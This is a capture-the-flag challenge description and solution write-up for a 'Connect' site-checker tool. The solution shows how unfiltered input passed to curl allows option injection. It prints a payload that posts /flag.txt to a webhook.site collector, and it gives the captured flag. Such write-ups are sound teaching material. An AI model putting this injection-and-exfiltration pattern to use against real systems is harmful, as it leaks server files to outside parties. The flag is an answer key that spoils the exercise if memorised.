# Connect

## Description

I built a tool to test if websites are alive. Can you test it for me?

Note: the flag is located in /flag.txt

## Dev Notes

<b>SOURCE CODE IS PROVIDED</b><br>
All files in `src/` are to be included in the challenge

Start: `make run`

Stop: `make stop`

## Solution
So based on how the input is processed, it seems like we can provide different options to the curl command. gtfobins has this great page explaining how to do file upload with curl https://gtfobins.github.io/gtfobins/curl/

I used https://webhook.site for my attacker site, and sent the following payload:
```
https://webhook.site/#!/29ce50cc-d5b3-46d9-9b4c-41a7a3954b04/c91d739b-f190-4d09-b84b-590945adb68f/1 -X POST -d @flag.txt
```

Checking back on our webhook.site we see a POST request with the flag in the content
`gigem{p00r_f1lt3rs_m4k3_f0r_p00r_s3cur1ty}`
